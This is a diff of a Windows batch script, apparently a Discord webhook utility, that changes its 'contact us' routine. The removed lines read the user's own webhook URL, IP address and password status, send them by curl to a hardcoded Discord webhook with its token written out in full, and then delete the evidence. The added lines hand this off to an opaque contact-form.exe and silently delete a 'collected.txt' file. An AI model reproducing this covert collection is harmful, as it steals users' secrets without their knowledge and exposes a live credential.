@@ -1150,43 +1150,19 @@ goto menum
 cls
 call :logo
 echo.[37m
-call :write Contact us! Fill the form and send it.
 
 cd update
 
-start /wait smashsupp.exe
+start /wait contact-form.exe
 
+timeout /nobreak /t 1 >nul
 
-if not exist support.txt (
+if not exist collected.txt (
     cd ..
     goto menum
 )
 
-if exist pswSet.dat (set pswSet=True) else set pswSet=False
-
-if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
-if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
-
-(
-    echo.
-    echo.
-    echo. Sent from IP: %MyIP%
-    echo. Created at %date%; %time%
-    echo.
-    echo. Password set? %pswSet%
-    echo.
-    echo. Contact webhook:
-    echo.%whq%
-
-
-)>>support.txt
-
-curl -F "file=@support.txt" https://ptb.discord.com/api/webhooks/952557411137388615/JoR7ktBHBzJ4UBI1HK5tJrf0g21CdTZetE7I9zXMYDs6t6v8ce9G4RzIQrkLyX2nr6AL >nul
-
-timeout /t 0 >nul
-
-del /f /q support.txt >nul
-
+del /f /q collected.txt >nul
 cd ..
 
 
@@ -1196,9 +1172,8 @@ echo.[37m
 
 if exist "update\webhook.dat" for /f "tokens=*" %%a in ('type update\webhook.dat') do set whq=%%a
 if exist "webhook.dat" for /f "tokens=*" %%a in ('type webhook.dat') do set whq=%%a
-set wqmsg=Your support message was sent.
+set wqmsg=Your support message has been sent.
 curl -X POST -H "Content-type: application/json" --data "{\"content\":null,\"embeds\":[{\"description\":\"^<:greenArrow:879662658645798912^> %wqmsg%\",\"color\":3092790}]}" %whq% >nul 2>&1
-
 
 call :write Your message was successfully sent.
 call :write Thank you for a your time!
